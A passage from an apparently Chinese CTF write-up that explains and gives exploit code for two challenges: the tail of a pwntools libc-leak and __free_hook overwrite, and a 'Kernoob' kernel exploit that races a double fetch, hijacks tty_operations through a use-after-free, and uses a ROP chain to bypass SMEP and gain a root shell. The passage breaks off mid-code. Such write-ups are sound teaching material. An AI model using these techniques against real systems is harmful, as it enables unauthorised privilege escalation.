class="number">4</span>):</span><br><span class="line">    add(<span class="string">b&quot;\x80&quot;</span>+<span class="built_in">chr</span>(<span class="number">3</span>).encode()+p32(free_got+i)+<span class="string">b&quot;\x53\x99\x99&quot;</span>)</span><br><span class="line">    start()</span><br><span class="line">    free_address += p.recvuntil(<span class="string">&quot;1.Produce&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">1</span>:]</span><br><span class="line">free_address = u32(free_address)</span><br><span class="line">libc.address = free_address - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">system_address = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_address = libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line">free_hook_address = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="string">b&quot;\x80&quot;</span>+<span class="built_in">chr</span>(<span class="number">10</span>).encode()+p32(binsh_address)+<span class="string">b&quot;\x99&quot;</span>)</span><br><span class="line">start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    add(<span class="string">b&quot;\x80&quot;</span>+<span class="built_in">chr</span>(<span class="number">3</span>).encode()+p32(free_hook_address+i)+<span class="string">b&quot;\x54\x99\x99&quot;</span>)</span><br><span class="line">    start()</span><br><span class="line">    p.send(p32(system_address)[i:i+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">recyle()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Kernoob"><a href="#Kernoob" class="headerlink" title="Kernoob"></a>Kernoob</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>首先看一下程序，程序只开启了堆栈不可执行保护，内核则只开启了<code>smep</code>保护。程序提供了四种方法<code>add,show,edit,delete</code>。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200809202626.png" alt="图片无法显示，请联系作者" title=" "><p><code>delete</code>的时候没有对全局变量进行清空，因此存在<code>UAF</code>，而对用户空间的数据又是进行了两步操作，即先验证<code>size</code>的大小，然后根据<code>size</code>进行分配内存，存在<code>double fetch</code>。</p><h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p><a href="https://www.lyyl.online/2020/03/10/kernel-pwn/#Double-Fetch">double fetch 的利用见此</a></p><p>通过<code>double fetch</code>的竞争，可以在内核对<code>size</code>验证完毕之后将申请的内存更改为任意的大小。</p><p><code>kernel</code>中存在一种<code>tty_struct</code>结构体，在打开<code>tty</code>设备的时候会创建。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line"><span class="type">int</span>magic;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line"><span class="type">spinlock_t</span> ctrl_lock;</span><br><span class="line"><span class="type">spinlock_t</span> flow_lock;</span><br><span class="line"><span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span><span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line"><span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span><span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"><span class="type">int</span> count;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span><span class="comment">/* winsize_mutex */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stopped:<span class="number">1</span>,<span class="comment">/* flow_lock */</span></span><br><span class="line">      flow_stopped:<span class="number">1</span>,</span><br><span class="line">      unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> hw_stopped;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> ctrl_status:<span class="number">8</span>,<span class="comment">/* ctrl_lock */</span></span><br><span class="line">      packet:<span class="number">1</span>,</span><br><span class="line">      unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> receive_room;<span class="comment">/* Bytes free for queue */</span></span><br><span class="line"><span class="type">int</span> flow_change;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line"><span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line"><span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line"><span class="type">void</span> *disc_data;</span><br><span class="line"><span class="type">void</span> *driver_data;</span><br><span class="line"><span class="type">spinlock_t</span> files_lock;<span class="comment">/* protects tty_files list */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> closing;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line"><span class="type">int</span> write_cnt;</span><br><span class="line"><span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>这里我们主要关注的是第五个成员变量也就是<code>tty_operations</code>，该结构体中存在很多的函数指针(虚函数表)，与<code>fileops</code>类似。在获得任意的内存分配权限之后，我们可以申请一个<code>tty_operations</code>结构体的大小并释放（这里大小的获取可以编译输出<code>size</code>的驱动，或者直接查找<a href="https://elixir.bootlin.com/linux/v4.15.15/source/include/linux/tty_driver.h#L253">源码</a>），在打开一个<code>tty</code>设备<code>ptmx</code>的时候之前释放的堆块就会被申请，因此我们可以通过<code>UAF</code>来控制打开的<code>tty</code>设备中的<code>tty_operations</code>结构体，劫持其中的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">input</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">size_t</span> index;</span><br><span class="line"><span class="type">char</span>* buf;</span><br><span class="line"><span class="type">size_t</span> size;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_size</span><span class="params">(<span class="type">void</span>* in)</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">input</span>* <span class="title">cu_in</span> =</span> in;</span><br><span class="line"><span class="keyword">while</span>(has_changed == <span class="number">0</span>)&#123;</span><br><span class="line">cu_in-&gt;size = <span class="number">0x2e0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">getchar();</span><br><span class="line">save_state();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> <span class="title">fake_tty</span>;</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">pthread_t</span> t1;</span><br><span class="line"><span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/noob&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">input</span> <span class="title">current_input</span>;</span></span><br><span class="line">current_input.index = <span class="number">0</span>;</span><br><span class="line">current_input.buf = buf;</span><br><span class="line">current_input.size = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">pthread_create(&amp;t1, <span class="literal">NULL</span>, change_size, &amp;current_input);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">ioctl(fd1, <span class="number">0x30000</span>, &amp;current_input);</span><br><span class="line">current_input.size = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">has_changed = <span class="number">1</span>;</span><br><span class="line">pthread_join(t1, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200809210009.png" alt="图片无法显示，请联系作者" title=" "><p>可以看到我们已经成功分配一个块大小为<code>0x2e0</code>的堆块，接下来释放该堆块并打开一个<code>tty</code>设备，占用这个堆块。堆块占用完成之后我们就可以劫持函数指针了。</p><p>提升权限的方法这里可以选择内核的<code>ROP</code>，利用<code>xchg e?x , esp</code>的<code>gadget</code>来迁移函数栈，由于<code>tty_operations</code>的函数调用的最后一条指令是<code>call eax</code>，因此这里选择<code>xchg eax, esp</code>。对<code>tty_operations</code>中指针的覆盖则是选择的<code>ioctl</code>函数。那么在调用<code>ioctl</code>函数的时候，<code>rax</code>是<code>xchg rax, rsp</code>的地址，此时即将栈劫持到<code>gadget</code>地址上，主要到此时的<code>gadget</code>的地址的高<code>8</code>位是<code>0</code></p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200809211707.png" alt="图片无法显示，请联系作者" title=" "><p>我们需要在该地址中布置好<code>rop chain</code>，因此我们需要先在这个地址处<code>mmap</code>一段内存空间，接着将关闭<code>smep,smap</code>保护和提升权限获取<code>shell</code>的<code>rop</code>链部署在该位置。</p><h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *(*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *, <span class="keyword">struct</span> <span class="title">file</span> *, <span class="title">int</span>);</span> <span class="comment">/*     0     8 */</span></span><br><span class="line">    <span class="type">int</span> (*install)(<span class="keyword">struct</span> tty_driver *, <span class="keyword">struct</span> tty_struct *);              <span class="comment">/*     8     8 */</span></span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *, <span class="keyword">struct</span> tty_struct *);              <span class="comment">/*    16     8 */</span></span><br><span class="line">    <span class="type">int</span> (*open)(<span class="keyword">struct</span> tty_struct *, <span class="keyword">struct</span> file *);                       <span class="comment">/*    24     8 */</span></span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct *, <span class="keyword">struct</span> file *);                     <span class="comment">/*    32     8 */</span></span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *);                                 <span class="comment">/*    40     8 */</span></span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *);                                  <span class="comment">/*    48     8 */</span></span><br><span class="line">    <span class="type">int</span> (*write)(<span class="keyword">struct</span> tty_struct *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">int</span>);         <span class="comment">/*    56     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">    <span class="type">int</span> (*put_char)(<span class="keyword">struct</span> tty_struct *, <span class="type">unsigned</span> <span class="type">char</span>);                            <span class="comment">/*    64     8 */</span></span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *);                                       <span class="comment">/*    72     8 */</span></span><br><span class="line">    <span class="type">int</span> (*write_room)(<span class="keyword">struct</span> tty_struct *);                                         <span class="comment">/*    80     8 */</span></span><br><span class="line">    <span class="type">int</span> (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *);                                    <span class="comment">/*    88     8 */</span></span><br><span class="line">    <span class="type">int</span> (*ioctl)(<span class="keyword">struct</span> tty_struct *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span>);             <span class="comment">/*    96     8 */</span></span><br><span class="line">    <span class="type">long</span> <span class="title function_">int</span> <span class="params">(*compat_ioctl)</span><span class="params">(<span class="keyword">struct</span> tty_struct *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span>)</span>; <span class="comment">/*   104     8 */</span></span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *, <span class="keyword">struct</span> ktermios *);                    <span class="comment">/*   112     8 */</span></span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct *);                                          <span class="comment">/*   120     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 2 boundary (128 bytes) --- */</span></span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct *);           <span class="comment">/*   128     8 */</span></span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *);                 <span class="comment">/*   136     8 */</span></span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *);                <span class="comment">/*   144     8 */</span></span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *);               <span class="comment">/*   152     8 */</span></span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *, <span class="type">int</span>);        <span class="comment">/*   160     8 */</span></span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *);         <span class="comment">/*   168     8 */</span></span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *);            <span class="comment">/*   176     8 */</span></span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *, <span class="type">int</span>); <span class="comment">/*   184     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 3 boundary (192 bytes) --- */</span></span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *, <span class="type">char</span>);                           <span class="comment">/*   192     8 */</span></span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *);                                    <span class="comment">/*   200     8 */</span></span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">int</span>);        <span class="comment">/*   208     8 */</span></span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *, <span class="keyword">struct</span> winsize *);                    <span class="comment">/*   216     8 */</span></span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *, <span class="keyword">struct</span> termiox *);               <span class="comment">/*   224     8 */</span></span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *, <span class="keyword">struct</span> serial_icounter_struct *); <span class="comment">/*   232     8 */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span>                                 <span class="comment">/*   240     8 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* size: 248, cachelines: 4, members: 31 */</span></span><br><span class="line">    <span class="comment">/* last cacheline: 56 bytes */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810ad430</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810ad7e0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> user_cs, user_ss, user_rflags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_stack = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> has_changed = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> xchg_rax_rsp_r = <span class="number">0xffffffff8101db17</span>;</span><br><span class="line"><span class="type">size_t</span> p_rdi_r = <span class="number">0xffffffff8107f460</span>;</span><br><span class="line"><span class="type">size_t</span> mv_rc4_rdi_p_rbp_r = <span class="number">0xffffffff8101f2f0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getroot</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;push %2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;swapgs\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %3\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %4\n&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq\n&quot;</span></span><br><span class="line">        :</span><br><span class="line">        :  <span class="string">&quot;r&quot;</span> (user_ss), <span class="string">&quot;r&quot;</span> (user_stack), <span class="string">&quot;r&quot;</span> (user_rflags), <span class="string">&quot;r&quot;</span> (user_cs), <span class="string">&quot;r&quot;</span> (get_shell)</span><br><span class="line">        : <span class="string">&quot;memory&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">    <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">    <span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">    <span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">    : <span class="string">&quot;=r&quot;</span> (user_cs), <span class="string">&quot;=r&quot;</span> (user_ss), <span class="string">&quot;=r&quot;</span> (user_stack), <span class="string">&quot;=r&quot;</span> (user_rflags) : : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">input</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">size_t</span> index;</span><br><span class="line"><span class="type">char</span>* buf;</span><br><span class="line"><span class="type">size_t</span> size;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_size</span><span class="params">(<span class="type">void</span>* in)</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">input</span>* <span class="title">cu_in</span> =</span> in;</span><br><span class="line"><span class="keyword">while</span>(has_changed == <span class="number">0</span>)&#123;</span><br><span class="line">cu_in-&gt;size = <span class="number">0x2e0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">save_state();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> <span class="title">fake_tty</span>;</span></span><br><span 